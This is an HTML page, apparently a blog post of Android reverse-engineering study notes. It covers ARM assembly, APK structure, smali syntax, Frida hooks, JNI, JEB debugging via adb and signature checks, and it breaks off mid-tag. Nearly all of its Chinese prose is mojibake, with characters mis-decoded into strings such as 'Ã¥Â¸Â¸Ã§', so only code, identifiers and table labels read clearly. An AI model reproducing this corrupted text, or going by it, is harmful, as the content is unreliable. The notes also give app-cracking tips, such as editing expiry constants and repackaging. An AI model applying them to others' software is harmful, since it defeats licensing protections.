¸ç©ºé—´</p>\n<p>Java åº”ç”¨ç¨‹åºæ— éœ€è¿‡å¤šè§£é‡Šï¼ŒåŸºæœ¬å¯ä»¥ç†è§£ä¸ºå„ä¸ª Appï¼Œç”± Java è¯­è¨€å®ç°ã€‚</p>\n<p>Java æ¡†æ¶å±‚ï¼ˆç³»ç»ŸæœåŠ¡ï¼‰å°±æ˜¯å¸¸è¯´çš„ Frameworkï¼Œè¿™å±‚é‡Œä¸œè¥¿å¾ˆå¤šä¹Ÿå¾ˆå¤æ‚ï¼Œæ¯”å¦‚è¯´ä¸»è¦çš„ä¸€äº›ç³»ç»ŸæœåŠ¡å¦‚ ActivityManagerServiceã€PackageManagerService ç­‰ï¼Œæˆ‘ä»¬ç¼–å†™çš„ Android ä»£ç ä¹‹æ‰€ä»¥èƒ½å¤Ÿæ­£å¸¸è¯†åˆ«å’ŒåŠ¨ä½œï¼Œéƒ½è¦ä¾èµ–è¿™ä¸€å±‚çš„æ”¯æŒã€‚è¿™ä¸€å±‚ä¹Ÿæ˜¯ç”± Java è¯­è¨€å®ç°ã€‚</p>\n<p>Native å±‚ï¼ˆæœ¬åœ°æœåŠ¡ï¼‰è¿™éƒ¨åˆ†å¸¸è§ä¸€äº›æœ¬åœ°æœåŠ¡å’Œä¸€äº›é“¾æ¥åº“ç­‰ã€‚è¿™ä¸€å±‚çš„ä¸€ä¸ªç‰¹ç‚¹å°±æ˜¯é€šè¿‡ C å’Œ C<ins> è¯­è¨€å®ç°ã€‚æ¯”å¦‚æˆ‘ä»¬ç°åœ¨è¦æ‰§è¡Œä¸€ä¸ªå¤æ‚è¿ç®—ï¼Œå¦‚æœé€šè¿‡ java ä»£ç å»å®ç°ï¼Œé‚£ä¹ˆæ•ˆç‡ä¼šéå¸¸ä½ï¼Œæ­¤æ—¶å¯ä»¥é€‰æ‹©é€šè¿‡ C æˆ– C</ins> ä»£ç å»å®ç°ï¼Œç„¶åå’Œæˆ‘ä»¬ä¸Šå±‚çš„ Java ä»£ç é€šä¿¡ï¼ˆè¿™éƒ¨åˆ†åœ¨ android ä¸­ç§°ä¸º jni æœºåˆ¶ï¼‰ã€‚åˆæ¯”å¦‚æˆ‘ä»¬çš„è®¾å¤‡éœ€è¦è¿è¡Œï¼Œé‚£ä¹ˆå¿…ç„¶è¦å’Œåº•å±‚çš„ç¡¬ä»¶é©±åŠ¨äº¤äº’ï¼Œä¹Ÿè¦é€šè¿‡ Native å±‚ã€‚</p>\n<p>Linux å†…æ ¸ç©ºé—´å°±ä¸è¿‡å¤šè§£é‡Šäº†</p>\n<h2 id=\"lab1\"><a class=\"markdownIt-Anchor\" href=\"#lab1\">#</a> lab1</h2>\n<p><img data-src=\"/images/image-20230711222422735.png\" alt=\"image-20230711222422735\"></p>\n<p><img data-src=\"/images/image-20230712144054758.png\" alt=\"image-20230712144054758\"></p>\n<p><img data-src=\"/images/image-20230712144128626.png\" alt=\"image-20230712144128626\"></p>\n<p><img data-src=\"/images/_979679506_Screenshot_20230712-144229_1689144149000_wifi_0.jpg\" alt=\"img\"></p>\n<h2 id=\"armæ±‡ç¼–å­¦ä¹ \"><a class=\"markdownIt-Anchor\" href=\"#armæ±‡ç¼–å­¦ä¹ \">#</a> ARM æ±‡ç¼–å­¦ä¹ </h2>\n<p>ç”¨ NDK ç¼–è¯‘ C è¯­è¨€æ–‡ä»¶å‡ºæ¥ ARM æ±‡ç¼–å¯¹æ¯”ç ”ç©¶</p>\n<p><img data-src=\"/images/image-20230713130819423.png\" alt=\"image-20230713130819423\"></p>\n<p>C:\\Users\\98762\\AppData\\Local\\Android\\Sdk\\ndk\\25.1.8937393\\toolchains\\llvm\\prebuilt\\windows-x86_64\\bin</p>\n<p>å»ºè®®ç›´æ¥æŠŠè·¯å¾„åŠ å…¥ç¯å¢ƒå˜é‡</p>\n<p><img data-src=\"/images/image-20230713134827964.png\" alt=\"image-20230713134827964\"></p>\n<p>ç”Ÿæˆçš„ ELF å¯æ‰§è¡Œæ–‡ä»¶å°±æ˜¯ ARM çš„å¯æ”¾ IDA</p>\n<p>ä¹Ÿå¯ä»¥ clang -target arm-linux-android21 -S demo.i -o demo.s å¾—æ±‡ç¼–ä»£ç </p>\n<p>æŒ‡ä»¤ï¼Œä¼ªæŒ‡ä»¤ (ç¼–è¯‘å™¨æä¾›ï¼Œç”¨äºæŒ‡å¯¼ç¼–è¯‘è¿‡ç¨‹) ä¸ç¬¦å·</p>\n<p>ä»æ±‡ç¼–ä»£ç åˆ°åå…­è¿›åˆ¶æ•°æ® (äºŒè¿›åˆ¶æ–‡ä»¶) å°±å«åšæ±‡ç¼–</p>\n<p>arm32 æ¯ä¸ªæŒ‡ä»¤ 4 å­—èŠ‚</p>\n<p>ARM æ˜¯ RISC (ç²¾ç®€æŒ‡ä»¤é›†) æ¶æ„çš„</p>\n<p><img data-src=\"/images/image-20230713144140075.png\" alt=\"image-20230713144140075\"></p>\n<p><img data-src=\"/images/image-20230713144404690.png\" alt=\"image-20230713144404690\"></p>\n<p>CPSR ç¨‹åºçŠ¶æ€å¯„å­˜å™¨</p>\n<p><img data-src=\"/images/image-20230714195334674.png\" alt=\"image-20230714195334674\"></p>\n<p>r13 æ˜¯å †æ ˆå¯„å­˜å™¨ï¼ŒæŒ‡å‘å †æ ˆçš„æ ˆé¡¶</p>\n<p>r14 (lr) ä¸€ä¸ªå‡½æ•°çš„è¿”å›åœ°å€</p>\n<p>r15(pc)</p>\n<p>r0-r12 é€šç”¨å¯„å­˜å™¨</p>\n<p>æ ¹æ®è°ƒç”¨è§„åˆ™ ATPCSï¼Œç¨‹åºä¸€èˆ¬éƒ½ä½¿ç”¨ FDï¼ˆFullDescendingï¼‰ç±»å‹çš„æ•°æ®æ ˆï¼ˆæ»¡æ ˆï¼‰</p>\n<p>æ»¡å‡æ ˆ</p>\n<p>stmfd sp!,  {r1-r4} (ç›¸å½“äº push)</p>\n<p><img data-src=\"/images/image-20231004143920320.png\" alt=\"image-20231004143920320\"></p>\n<p>è·³è½¬æŒ‡ä»¤:</p>\n<p>B æ— æ¡ä»¶è·³è½¬</p>\n<p>BL å¸¦é“¾æ¥çš„æ— æ¡ä»¶è·³è½¬</p>\n<p>BX å¸¦çŠ¶æ€åˆ‡æ¢çš„æ— æ¡ä»¶è·³è½¬</p>\n<p>BLX å¸¦é“¾æ¥å’ŒçŠ¶æ€åˆ‡æ¢çš„æ— æ¡ä»¶è·³è½¬ (BLX æŒ‡ä»¤ä» ARM æŒ‡ä»¤é›†è·³è½¬åˆ°æŒ‡ä»¤ä¸­æ‰€æŒ‡å®šçš„ç›®æ ‡åœ°å€ï¼Œå¹¶å°†å¤„ç†å™¨çš„å·¥ä½œçŠ¶æ€ç”± ARM çŠ¶æ€åˆ‡æ¢åˆ° Thumb çŠ¶æ€)</p>\n<h2 id=\"apkç»“æ„\"><a class=\"markdownIt-Anchor\" href=\"#apkç»“æ„\">#</a> apk ç»“æ„</h2>\n<p>apk å…¨ç§° Android Packageï¼Œå®ƒç›¸å½“äºä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œåªè¦åœ¨ç”µè„‘ä¸Šå°† apk åç¼€æ”¹ä¸º zip å³å¯è§£å‹ã€‚</p>\n<table>\n<thead>\n<tr>\n<th>æ–‡ä»¶</th>\n<th>æ³¨é‡Š</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>assets ç›®å½•</td>\n<td>å­˜æ”¾ APK çš„é™æ€èµ„æºæ–‡ä»¶ï¼Œæ¯”å¦‚è§†é¢‘ï¼ŒéŸ³é¢‘ï¼Œå›¾ç‰‡ç­‰</td>\n</tr>\n<tr>\n<td>lib ç›®å½•</td>\n<td>armeabi-v7a åŸºæœ¬é€šç”¨æ‰€æœ‰ android è®¾å¤‡ï¼Œarm64-v8a åªé€‚ç”¨äº 64 ä½çš„ android è®¾å¤‡ï¼Œx86 å¸¸è§ç”¨äº android æ¨¡æ‹Ÿå™¨ï¼Œå…¶ç›®å½•ä¸‹çš„.so æ–‡ä»¶æ˜¯ c æˆ– c++ ç¼–è¯‘çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶</td>\n</tr>\n<tr>\n<td>META-INF ç›®å½•</td>\n<td>ä¿å­˜åº”ç”¨çš„ç­¾åä¿¡æ¯ï¼Œç­¾åä¿¡æ¯å¯ä»¥éªŒè¯ APK æ–‡ä»¶çš„å®Œæ•´æ€§ï¼Œç›¸å½“äº APK çš„èº«ä»½è¯ (éªŒè¯æ–‡ä»¶æ˜¯å¦åˆè¢«ä¿®æ”¹)</td>\n</tr>\n<tr>\n<td>res ç›®å½•</td>\n<td>res ç›®å½•å­˜æ”¾èµ„æºæ–‡ä»¶ï¼ŒåŒ…æ‹¬å›¾ç‰‡ï¼Œå­—ç¬¦ä¸²ç­‰ç­‰ï¼ŒAPK çš„è„¸è›‹ç”±ä»–çš„ layout æ–‡ä»¶è®¾è®¡</td>\n</tr>\n<tr>\n<td>AndroidMainfest.xml æ–‡ä»¶</td>\n<td>APK çš„åº”ç”¨æ¸…å•ä¿¡æ¯ï¼Œå®ƒæè¿°äº†åº”ç”¨çš„åå­—ï¼Œç‰ˆæœ¬ï¼Œæƒé™ï¼Œå¼•ç”¨çš„åº“æ–‡ä»¶ç­‰ç­‰ä¿¡æ¯</td>\n</tr>\n<tr>\n<td>classes.dex æ–‡ä»¶</td>\n<td>classes.dex æ˜¯ java æºç ç¼–è¯‘åç”Ÿæˆçš„ java å­—èŠ‚ç æ–‡ä»¶ï¼ŒAPK è¿è¡Œçš„ä¸»è¦é€»è¾‘</td>\n</tr>\n<tr>\n<td>resources.arsc æ–‡ä»¶</td>\n<td>resources.arsc æ˜¯ç¼–è¯‘åçš„äºŒè¿›åˆ¶èµ„æºæ–‡ä»¶ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ˜ å°„è¡¨ï¼Œæ˜ å°„ç€èµ„æºå’Œ idï¼Œé€šè¿‡ R æ–‡ä»¶ä¸­çš„ id å°±å¯ä»¥æ‰¾åˆ°å¯¹åº”çš„èµ„æº</td>\n</tr>\n</tbody>\n</table>\n<p><strong>APK çš„åŒå¼€ (æ”¹åŒ…å)</strong></p>\n<p><strong>æ±‰åŒ–</strong>ï¼šä½¿ç”¨ä¸“é—¨çš„å·¥å…·å¯¹å¤–æ–‡ç‰ˆçš„è½¯ä»¶èµ„æºè¿›è¡Œè¯»å–ã€ç¿»è¯‘ã€ä¿®æ”¹ã€å›å†™ç­‰ä¸€ç³»åˆ—å¤„ç†ï¼Œä½¿è½¯ä»¶çš„èœå•ã€å¯¹è¯æ¡†ã€æç¤ºç­‰ç”¨æˆ·ç•Œé¢æ˜¾ç¤ºä¸ºä¸­æ–‡ï¼Œè€Œç¨‹åºçš„å†…æ ¸å’ŒåŠŸèƒ½ä¿æŒä¸å˜ï¼Œè¿™ä¸ªè¿‡ç¨‹å³ä¸ºè½¯ä»¶æ±‰åŒ–</p>\n<p><strong>åŸºæœ¬ä¸Šå­—ç¬¦ä¸²éƒ½æ˜¯åœ¨ arsc é‡Œï¼Œå»ºè®®ä¸€é”®æ±‰åŒ–ï¼Œç„¶åå†æ¶¦è‰²ã€‚<br>\nå°‘é‡æ²¡æ±‰åŒ–åˆ°çš„å­—ç¬¦ä¸²å‚è€ƒè§†é¢‘ä¸­çš„æ–¹æ³•å®šä½å»é€ä¸ªæ±‰åŒ–ã€‚</strong></p>\n<p>æ³¨æ„ç­¾åæ ¡éªŒ</p>\n<h2 id=\"jnié™æ€æ³¨å†Œä¸åŠ¨æ€æ³¨å†Œ\"><a class=\"markdownIt-Anchor\" href=\"#jnié™æ€æ³¨å†Œä¸åŠ¨æ€æ³¨å†Œ\">#</a> JNI é™æ€æ³¨å†Œä¸åŠ¨æ€æ³¨å†Œ</h2>\n<p>1ã€æŒ‰ç…§ JNI è§„èŒƒçš„å‘½åè§„åˆ™è¿›è¡ŒæŸ¥æ‰¾ï¼Œè¿™ç§æ–¹å¼å«é™æ€æ³¨å†Œã€‚(åŒ…å - ç±»å - æ–¹æ³•å - æ–¹æ³•å‚æ•°)<br>\n 2ã€è°ƒç”¨ JNI æä¾›çš„ <code>RegisterNatives</code>  å‡½æ•°ï¼Œå°†æœ¬åœ°å‡½æ•°æ³¨å†Œåˆ° JVM ä¸­ï¼Œè¿™ç§æ–¹å¼å«åŠ¨æ€æ³¨å†Œã€‚</p>\n<h2 id=\"hookç›¸å…³\"><a class=\"markdownIt-Anchor\" href=\"#hookç›¸å…³\">#</a> HOOK ç›¸å…³</h2>\n<h4 id=\"åŠ¨é™æ€hook\"><a class=\"markdownIt-Anchor\" href=\"#åŠ¨é™æ€hook\">#</a> åŠ¨é™æ€ hook</h4>\n<p>åŠ¨æ€å‡½æ•°ï¼šéœ€è¦å¾—åˆ°å…¶å®ä¾‹ï¼ˆ$new æˆ– Java.chooseï¼‰, å¦‚æœæ˜¯ Java.choose åˆ™åœ¨ onMatch è¿›è¡Œå…·ä½“æ“ä½œï¼›<br>\né™æ€å‡½æ•°ï¼šç›´æ¥ç”¨ Java.use å‡ºæ¥çš„ç±»æ¥è°ƒç”¨å…·ä½“çš„é™æ€å‡½æ•°å³å¯ã€‚</p>\n<p>frida æ—¥å¸¸ä½¿ç”¨å¯å‚è€ƒ http://www.juziss.cn/2020/11/14/Frida% E6%97% A5% E5% B8% B8% E4% BD% BF% E7%94% A8% E6%80% BB% E7% BB%93/</p>\n<p><strong>æœ‰ç©ºåš lab8-lab11</strong></p>\n<h2 id=\"ä»€ä¹ˆæ˜¯jvm-dalvik-art\"><a class=\"markdownIt-Anchor\" href=\"#ä»€ä¹ˆæ˜¯jvm-dalvik-art\">#</a> ä»€ä¹ˆæ˜¯ JVMã€Dalvikã€ART</h2>\n<p>JVM æ˜¯ JAVA è™šæ‹Ÿæœºï¼Œè¿è¡Œ JAVA å­—èŠ‚ç ç¨‹åº<br>\n Dalvik æ˜¯ Google ä¸“é—¨ä¸º Android è®¾è®¡çš„ä¸€ä¸ªè™šæ‹Ÿæœºï¼ŒDalvik æœ‰ä¸“å±çš„æ–‡ä»¶æ‰§è¡Œæ ¼å¼ dex (Dalvik executable)<br>\n Art (Android Runtime) ç›¸å½“äº Dalvik çš„å‡çº§ç‰ˆï¼Œæœ¬è´¨ä¸ Dalvik æ— å¼‚</p>\n<h2 id=\"smaliåŠå…¶è¯­æ³•\"><a class=\"markdownIt-Anchor\" href=\"#smaliåŠå…¶è¯­æ³•\">#</a> smali åŠå…¶è¯­æ³•</h2>\n<p>å¯„å­˜å™¨é‡‡ç”¨ v å’Œ p æ¥å‘½åï¼Œv è¡¨ç¤ºæœ¬åœ°å¯„å­˜å™¨ (å±€éƒ¨å˜é‡)ï¼Œp è¡¨ç¤ºå‚æ•°å¯„å­˜å™¨</p>\n<p>smali æ˜¯ Dalvik çš„å¯„å­˜å™¨è¯­è¨€ï¼Œsmali ä»£ç æ˜¯ dex åç¼–è¯‘è€Œæ¥çš„ã€‚</p>\n<p>å…³é”®å­—</p>\n<table>\n<thead>\n<tr>\n<th>åç§°</th>\n<th>æ³¨é‡Š</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>.class</td>\n<td>ç±»å</td>\n</tr>\n<tr>\n<td>.super</td>\n<td>çˆ¶ç±»åï¼Œç»§æ‰¿çš„ä¸Šçº§ç±»ååç§°</td>\n</tr>\n<tr>\n<td>.source</td>\n<td>æºå</td>\n</tr>\n<tr>\n<td>.field</td>\n<td>å˜é‡</td>\n</tr>\n<tr>\n<td>.method</td>\n<td>æ–¹æ³•å</td>\n</tr>\n<tr>\n<td>.register</td>\n<td>å¯„å­˜å™¨</td>\n</tr>\n<tr>\n<td>.end method</td>\n<td>æ–¹æ³•åçš„ç»“æŸ</td>\n</tr>\n<tr>\n<td>public</td>\n<td>å…¬æœ‰</td>\n</tr>\n<tr>\n<td>protected</td>\n<td>åŠå…¬å¼€ï¼Œåªæœ‰åŒä¸€å®¶äººæ‰èƒ½ç”¨</td>\n</tr>\n<tr>\n<td>private</td>\n<td>ç§æœ‰ï¼Œåªèƒ½è‡ªå·±ä½¿ç”¨</td>\n</tr>\n<tr>\n<td>.parameter</td>\n<td>æ–¹æ³•å‚æ•°</td>\n</tr>\n<tr>\n<td>.prologue</td>\n<td>æ–¹æ³•å¼€å§‹</td>\n</tr>\n<tr>\n<td>.line xxx</td>\n<td>ä½äºç¬¬ xxx è¡Œ</td>\n</tr>\n</tbody>\n</table>\n<p>æ•°æ®ç±»å‹å¯¹åº”</p>\n<table>\n<thead>\n<tr>\n<th>smali ç±»å‹</th>\n<th>java ç±»å‹</th>\n<th>æ³¨é‡Š</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>V</td>\n<td>void</td>\n<td>æ— è¿”å›å€¼</td>\n</tr>\n<tr>\n<td>Z</td>\n<td>boolean</td>\n<td>å¸ƒå°”å€¼ç±»å‹ï¼Œè¿”å› 0 æˆ– 1</td>\n</tr>\n<tr>\n<td>B</td>\n<td>byte</td>\n<td>å­—èŠ‚ç±»å‹ï¼Œè¿”å›å­—èŠ‚</td>\n</tr>\n<tr>\n<td>S</td>\n<td>short</td>\n<td>çŸ­æ•´æ•°ç±»å‹ï¼Œè¿”å›æ•°å­—</td>\n</tr>\n<tr>\n<td>C</td>\n<td>char</td>\n<td>å­—ç¬¦ç±»å‹ï¼Œè¿”å›å­—ç¬¦</td>\n</tr>\n<tr>\n<td>I</td>\n<td>int</td>\n<td>æ•´æ•°ç±»å‹ï¼Œè¿”å›æ•°å­—</td>\n</tr>\n<tr>\n<td>J</td>\n<td>long ï¼ˆ64 ä½ éœ€è¦ 2 ä¸ªå¯„å­˜å™¨å­˜å‚¨ï¼‰</td>\n<td>é•¿æ•´æ•°ç±»å‹ï¼Œè¿”å›æ•°å­—</td>\n</tr>\n<tr>\n<td>F</td>\n<td>float</td>\n<td>å•æµ®ç‚¹ç±»å‹ï¼Œè¿”å›æ•°å­—</td>\n</tr>\n<tr>\n<td>D</td>\n<td>double ï¼ˆ64 ä½ éœ€è¦ 2 ä¸ªå¯„å­˜å™¨å­˜å‚¨ï¼‰</td>\n<td>åŒæµ®ç‚¹ç±»å‹ï¼Œè¿”å›æ•°å­—</td>\n</tr>\n<tr>\n<td>string</td>\n<td>String</td>\n<td>æ–‡æœ¬ç±»å‹ï¼Œè¿”å›å­—ç¬¦ä¸²</td>\n</tr>\n<tr>\n<td>Lxxx/xxx/xxx</td>\n<td>object</td>\n<td>å¯¹è±¡ç±»å‹ï¼Œè¿”å›å¯¹è±¡</td>\n</tr>\n</tbody>\n</table>\n<p>å¸¸ç”¨æŒ‡ä»¤</p>\n<table>\n<thead>\n<tr>\n<th>å…³é”®å­—</th>\n<th>æ³¨é‡Š</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>const</td>\n<td>é‡å†™æ•´æ•°å±æ€§ï¼ŒçœŸå‡å±æ€§å†…å®¹ï¼Œåªèƒ½æ˜¯æ•°å­—ç±»å‹</td>\n</tr>\n<tr>\n<td>const-string</td>\n<td>é‡å†™å­—ç¬¦ä¸²å†…å®¹</td>\n</tr>\n<tr>\n<td>const-wide</td>\n<td>é‡å†™é•¿æ•´æ•°ç±»å‹ï¼Œå¤šç”¨äºä¿®æ”¹åˆ°æœŸæ—¶é—´ã€‚</td>\n</tr>\n<tr>\n<td>return</td>\n<td>è¿”å›æŒ‡ä»¤</td>\n</tr>\n<tr>\n<td>if-eq</td>\n<td>å…¨ç§° equal (a=b)ï¼Œæ¯”è¾ƒå¯„å­˜å™¨ ab å†…å®¹ï¼Œç›¸åŒåˆ™è·³</td>\n</tr>\n<tr>\n<td>if-ne</td>\n<td>å…¨ç§° not equal (a!=b)ï¼Œab å†…å®¹ä¸ç›¸åŒåˆ™è·³</td>\n</tr>\n<tr>\n<td>if-eqz</td>\n<td>å…¨ç§° equal zero (a=0)ï¼Œz å³æ˜¯ 0 çš„æ ‡è®°ï¼Œa ç­‰äº 0 åˆ™è·³</td>\n</tr>\n<tr>\n<td>if-nez</td>\n<td>å…¨ç§° not equal zero (a!=0)ï¼Œa ä¸ç­‰äº 0 åˆ™è·³</td>\n</tr>\n<tr>\n<td>if-ge</td>\n<td>å…¨ç§° greater equal (a&gt;=b)ï¼Œa å¤§äºæˆ–ç­‰äºåˆ™è·³</td>\n</tr>\n<tr>\n<td>if-le</td>\n<td>å…¨ç§° little equal (a&lt;=b)ï¼Œa å°äºæˆ–ç­‰äºåˆ™è·³</td>\n</tr>\n<tr>\n<td>goto</td>\n<td>å¼ºåˆ¶è·³åˆ°æŒ‡å®šä½ç½®</td>\n</tr>\n<tr>\n<td>switch</td>\n<td>åˆ†æ”¯è·³è½¬ï¼Œä¸€èˆ¬ä¼šæœ‰å¤šä¸ªåˆ†æ”¯çº¿ï¼Œå¹¶æ ¹æ®æŒ‡ä»¤è·³è½¬åˆ°é€‚å½“ä½ç½®</td>\n</tr>\n<tr>\n<td>iget</td>\n<td>è·å–å¯„å­˜å™¨æ•°æ®</td>\n</tr>\n</tbody>\n</table>\n<p>å…¶ä½™æŒ‡ä»¤å¯ç”¨è¯­æ³•å·¥å…·æŸ¥è¯¢</p>\n<p>å®šä½æ–¹æ³•ï¼šæœç´¢å¼¹çª—å…³é”®å­— (MT,jadx)ã€æŠ“å–æŒ‰é’® id (å¼€å‘è€…åŠ©æ‰‹)</p>\n<p>é™æ€åˆ†æå·¥å…·:jadx</p>\n<p>ä¿®æ”¹å·¥å…·ï¼šMT ç®¡ç†å™¨</p>\n<h2 id=\"activityç”Ÿå‘½å‘¨æœŸ\"><a class=\"markdownIt-Anchor\" href=\"#activityç”Ÿå‘½å‘¨æœŸ\">#</a> Activity ç”Ÿå‘½å‘¨æœŸ</h2>\n<table>\n<thead>\n<tr>\n<th>å‡½æ•°åç§°</th>\n<th>æè¿°</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>onCreate()</td>\n<td>ä¸€ä¸ª Activity å¯åŠ¨åç¬¬ä¸€ä¸ªè¢«è°ƒç”¨çš„å‡½æ•°ï¼Œå¸¸ç”¨æ¥åœ¨æ­¤æ–¹æ³•ä¸­è¿›è¡Œ Activity çš„ä¸€äº›åˆå§‹åŒ–æ“ä½œã€‚ä¾‹å¦‚åˆ›å»º Viewï¼Œç»‘å®šæ•°æ®ï¼Œæ³¨å†Œç›‘å¬ï¼ŒåŠ è½½å‚æ•°ç­‰ã€‚</td>\n</tr>\n<tr>\n<td>onStart()</td>\n<td>å½“ Activity æ˜¾ç¤ºåœ¨å±å¹•ä¸Šæ—¶ï¼Œæ­¤æ–¹æ³•è¢«è°ƒç”¨ä½†æ­¤æ—¶è¿˜æ— æ³•è¿›è¡Œä¸ç”¨æˆ·çš„äº¤äº’æ“ä½œã€‚</td>\n</tr>\n<tr>\n<td>onResume()</td>\n<td>è¿™ä¸ªæ–¹æ³•åœ¨ onStart () ä¹‹åè°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯åœ¨ Activity å‡†å¤‡å¥½ä¸ç”¨æˆ·è¿›è¡Œäº¤äº’çš„æ—¶å€™è°ƒç”¨ï¼Œæ­¤æ—¶çš„ Activity ä¸€å®šä½äº Activity æ ˆé¡¶ï¼Œå¤„äºè¿è¡ŒçŠ¶æ€ã€‚</td>\n</tr>\n<tr>\n<td>onPause()</td>\n<td>è¿™ä¸ªæ–¹æ³•æ˜¯åœ¨ç³»ç»Ÿå‡†å¤‡å»å¯åŠ¨æˆ–è€…æ¢å¤å¦å¤–ä¸€ä¸ª Activity çš„æ—¶å€™è°ƒç”¨ï¼Œé€šå¸¸åœ¨è¿™ä¸ªæ–¹æ³•ä¸­æ‰§è¡Œä¸€äº›é‡Šæ”¾èµ„æºçš„æ–¹æ³•ï¼Œä»¥åŠä¿å­˜ä¸€äº›å…³é”®æ•°æ®ã€‚</td>\n</tr>\n<tr>\n<td>onStop()</td>\n<td>è¿™ä¸ªæ–¹æ³•æ˜¯åœ¨ Activity å®Œå…¨ä¸å¯è§çš„æ—¶å€™è°ƒç”¨çš„ã€‚</td>\n</tr>\n<tr>\n<td>onDestroy()</td>\n<td>è¿™ä¸ªæ–¹æ³•åœ¨ Activity é”€æ¯ä¹‹å‰è°ƒç”¨ï¼Œä¹‹å Activity çš„çŠ¶æ€ä¸ºé”€æ¯çŠ¶æ€ã€‚</td>\n</tr>\n<tr>\n<td>onRestart()</td>\n<td>å½“ Activity ä»åœæ­¢ stop çŠ¶æ€æ¢è¿›å…¥ start çŠ¶æ€æ—¶è°ƒç”¨çŠ¶æ€ã€‚</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"åŠ¨æ€è°ƒè¯•æ­¥éª¤\"><a class=\"markdownIt-Anchor\" href=\"#åŠ¨æ€è°ƒè¯•æ­¥éª¤\">#</a> åŠ¨æ€è°ƒè¯•æ­¥éª¤</h2>\n<h3 id=\"1ä¿®æ”¹debugæƒé™\"><a class=\"markdownIt-Anchor\" href=\"#1ä¿®æ”¹debugæƒé™\">#</a> 1. ä¿®æ”¹ debug æƒé™</h3>\n<p>æ–¹æ³•ä¸€ï¼šåœ¨ AndroidManifest.xml é‡Œæ·»åŠ å¯è°ƒè¯•æƒé™</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>å¤åˆ¶ä»£ç  éšè—ä»£ç </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>android:debuggable=\"true\"</pre></td></tr></table></figure><p>æ–¹æ³•äºŒï¼šXappDebug æ¨¡å— hook å¯¹åº”çš„ app</p>\n<p>é¡¹ç›®åœ°å€</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1BhbGF0aXMvWEFwcERlYnVn\">XappDebug</span></p>\n<h3 id=\"2ç«¯å£è½¬å‘ä»¥åŠå¼€å¯adbæƒé™\"><a class=\"markdownIt-Anchor\" href=\"#2ç«¯å£è½¬å‘ä»¥åŠå¼€å¯adbæƒé™\">#</a> 2. ç«¯å£è½¬å‘ä»¥åŠå¼€å¯ adb æƒé™</h3>\n<h3 id=\"3ä¸‹æ®µç‚¹\"><a class=\"markdownIt-Anchor\" href=\"#3ä¸‹æ®µç‚¹\">#</a> 3. ä¸‹æ®µç‚¹</h3>\n<p>ctrl+b ä¸‹æ–­ç‚¹</p>\n<h3 id=\"4debugæ¨¡å¼å¯åŠ¨\"><a class=\"markdownIt-Anchor\" href=\"#4debugæ¨¡å¼å¯åŠ¨\">#</a> 4.debug æ¨¡å¼å¯åŠ¨</h3>\n<pre><code class=\"language-avrasm\"> å¤åˆ¶ä»£ç  éšè—ä»£ç \nadb shell am start -D -n com.zj.wuaipojie/.ui.MainActivity\n</code></pre>\n<p>adb shell am start -D -n<br>\nadb shell am start -D -n åŒ…å / ç±»å<br>\n am start -n è¡¨ç¤ºå¯åŠ¨ä¸€ä¸ª activity<br>\nam start -D è¡¨ç¤ºå°†åº”ç”¨è®¾ç½®ä¸ºå¯è°ƒè¯•æ¨¡å¼</p>\n<h3 id=\"5jebé™„åŠ è°ƒè¯•è¿›ç¨‹\"><a class=\"markdownIt-Anchor\" href=\"#5jebé™„åŠ è°ƒè¯•è¿›ç¨‹\">#</a> 5.Jeb é™„åŠ è°ƒè¯•è¿›ç¨‹</h3>\n<p>å¿«æ·é”®ï¼š<br>\nR è¿è¡Œåˆ°å…‰æ ‡å¤„</p>\n<h2 id=\"logæ’æ¡©\"><a class=\"markdownIt-Anchor\" href=\"#logæ’æ¡©\">#</a> Log æ’æ¡©</h2>\n<p>å®šä¹‰ï¼šLog æ’æ¡©æŒ‡çš„æ˜¯åç¼–è¯‘ APK æ–‡ä»¶æ—¶ï¼Œåœ¨å¯¹åº”çš„ smali æ–‡ä»¶é‡Œï¼Œæ·»åŠ ç›¸åº”çš„ smali ä»£ç ï¼Œå°†ç¨‹åºä¸­çš„å…³é”®ä¿¡æ¯ï¼Œä»¥ log æ—¥å¿—çš„å½¢å¼è¿›è¡Œè¾“å‡ºã€‚</p>\n<p>è°ƒç”¨å‘½ä»¤</p>\n<figure class=\"highlight smali\"><figcaption data-lang=\"smali\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>invoke-static <span class=\"token punctuation\">&#123;</span>å¯¹åº”å¯„å­˜å™¨<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\"><span class=\"token builtin\">L</span><span class=\"token namespace\">com<span class=\"token punctuation\">/</span>mtools<span class=\"token punctuation\">/</span></span><span class=\"token class-name\">LogUtils</span></span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">v</span><span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token builtin\">L</span><span class=\"token namespace\">java<span class=\"token punctuation\">/</span>lang<span class=\"token punctuation\">/</span></span><span class=\"token class-name\">Object</span></span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token builtin\">V</span></pre></td></tr></table></figure><h2 id=\"ç­¾åæ ¡éªŒ\"><a class=\"markdownIt-Anchor\" href=\"#ç­¾åæ ¡éªŒ\">#</a> ç­¾åæ ¡éªŒ</h2>\n<p>å¦‚ä½•åˆ¤æ–­æ˜¯å¦æœ‰ç­¾åæ ¡éªŒï¼Ÿ<br>\nä¸åšä»»ä½•ä¿®æ”¹ï¼Œç›´æ¥ç­¾åå®‰è£…ï¼Œåº”ç”¨é—ªé€€åˆ™è¯´æ˜å¤§æ¦‚ç‡æœ‰ç­¾åæ ¡éªŒ</p>\n<figure class=\"highlight lua\"><figcaption data-lang=\"lua\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>kill<span class=\"token operator\">/</span>killProcess<span class=\"token 